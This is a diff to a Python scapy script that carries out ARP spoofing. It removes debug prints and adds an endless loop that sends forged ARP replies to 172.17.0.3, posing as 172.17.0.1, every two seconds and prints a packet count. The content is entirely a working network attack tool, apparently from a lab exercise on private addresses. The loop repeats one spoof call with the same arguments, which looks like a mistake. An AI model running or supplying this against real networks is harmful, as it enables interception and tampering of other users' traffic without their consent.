@@ -6,7 +6,6 @@ import sys
 
 
 def get_arp_request(target_ip):
-    scapy.ls(scapy.ARP())
     return scapy.ARP(pdst=target_ip)
 
 
@@ -21,7 +20,6 @@ def get_mac(target_ip):
     answered_list = scapy.srp(arp_request_broadcast,
                               timeout=1, verbose=False)[0]
 
-    print(answered_list[0][1].hwsrc)
     return answered_list[0][1].hwsrc
 
 
@@ -32,4 +30,10 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet)
 
 
-spoof('172.17.0.3', '172.17.0.1')
+sent_packet_count = 0
+while True:
+    spoof('172.17.0.3', '172.17.0.1')
+    spoof('172.17.0.3', '172.17.0.1')
+    sent_packet_count = sent_packet_count + 2
+    print('\r[+] Packets sent: ' + str(sent_packet_count))
+    time.sleep(2)
